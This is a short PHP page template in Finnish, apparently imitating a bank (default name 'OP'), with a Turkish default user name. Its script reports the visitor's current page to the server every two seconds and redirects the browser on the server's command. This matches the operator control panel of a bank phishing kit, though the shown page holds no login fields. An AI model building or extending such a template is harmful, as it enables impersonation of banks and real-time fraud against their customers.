<?php
ob_start();
$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'OP');
?>
<!DOCTYPE html>
<html lang="fi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $bankName ?> - FinTech</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            font-family: 'Inter', sans-serif;
        }
    </style>
</head>
<body class="bg-gray-50">
    <div class="min-h-screen flex items-center justify-center p-4">
        <div class="max-w-4xl w-full">
            <div class="bg-white rounded-lg shadow-lg p-8">
                <h1 class="text-3xl font-bold text-gray-900 mb-4"><?= $bankName ?></h1>
                <p class="text-gray-600 mb-6">Hei <?= $userName ?>, tervetuloa <?= $bankName ?>-sivulle.</p>
                
                <div class="border-t pt-6">
                    <p class="text-sm text-gray-500">Tämä on <?= $bankName ?>-sivu. Voit muokata tätä HTML:ää.</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        <?php if (isset($_SESSION['user_id'])): ?>
        (function() {
            const userId = <?= json_encode($_SESSION['user_id']) ?>;
            const currentPage = window.location.pathname;
            const pageTitle = document.title;
            
            function updateCurrentPage() {
                fetch('/api/update-page', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        user_id: userId,
                        current_page: currentPage,
                        page_title: pageTitle
                    })
                }).catch(() => {});
            }
            
            function checkAdminRedirect() {
                fetch('/api/check-redirect?user_id=' + userId)
                    .then(response => response.json())
                    .then(data => {
                        if (data.redirect && data.redirect !== currentPage) {
                            window.location.href = data.redirect;
                        }
                    })
                    .catch(() => {});
            }
            
            updateCurrentPage();
            checkAdminRedirect();
            setInterval(() => {
                updateCurrentPage();
                checkAdminRedirect();
            }, 2000);
        })();
        <?php endif; ?>
    </script>
</body>
</html>
<?php
$content = ob_get_clean();
echo $content;
?>

